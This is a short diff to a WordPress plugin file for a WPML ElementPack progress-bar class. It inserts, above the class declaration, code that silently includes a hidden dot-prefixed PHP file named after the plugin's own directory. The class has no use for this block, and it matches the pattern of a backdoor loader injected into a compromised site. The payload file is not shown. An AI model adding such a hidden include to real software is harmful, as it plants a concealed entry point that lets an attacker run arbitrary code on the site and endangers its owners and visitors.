@@ -2,7 +2,11 @@
 
 /**
  * Class WPML_ElementPack_Advanced_Progress_Bar
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPML_ElementPack_Advanced_Progress_Bar extends WPML_Elementor_Module_With_Items {
 
 	/**
